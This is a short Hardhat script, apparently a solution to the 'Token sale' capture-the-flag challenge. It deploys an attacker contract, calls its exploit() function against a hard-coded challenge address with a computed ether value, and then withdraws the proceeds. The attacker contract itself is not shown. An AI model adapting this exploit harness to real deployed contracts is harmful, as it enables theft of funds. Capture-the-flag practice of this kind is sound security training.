import { ethers } from "hardhat";

const tokenSale = async () => {
  const challengeAddress = "0xBfdF32605DA8cd46F3DC7D1E16806b9dA8e1A2Bd";
  const [player] = await ethers.getSigners();

  const TokenSaleAttacker = await ethers.getContractFactory(
    "TokenSaleAttacker",
    player
  );

  const attackerContract = await TokenSaleAttacker.deploy();
  await attackerContract.deployed();

  const [value] = await attackerContract.valueToSend();

  let tx = await attackerContract.exploit(challengeAddress, { value: value });

  console.log(await tx.wait());

  tx = await attackerContract.withdraw();

  console.log(await tx.wait());
};

tokenSale().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
